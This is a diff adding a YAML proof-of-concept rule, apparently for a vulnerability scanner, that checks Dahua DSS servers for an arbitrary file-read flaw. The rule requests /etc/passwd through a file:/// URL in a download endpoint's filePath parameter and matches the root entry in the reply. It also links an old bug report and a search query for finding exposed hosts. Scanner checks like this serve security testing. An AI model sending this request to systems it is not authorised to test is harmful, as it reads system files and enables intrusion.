@@ -1,0 +1,12 @@
+name: poc-yaml-dahuadss-fileread
+rules:
+  - method: GET
+    path: /itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+    follow_redirects: false
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body) && response.headers["Content-disposition"].contains("attachment")
+detail:
+  author: liberty
+  links:
+    - http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-0150611
+    - https://classic.fofa.so/result?q=%2Fitc%2Flogin_init.action&qbase64=L2l0Yy9sb2dpbl9pbml0LmFjdGlvbg%3D%3D
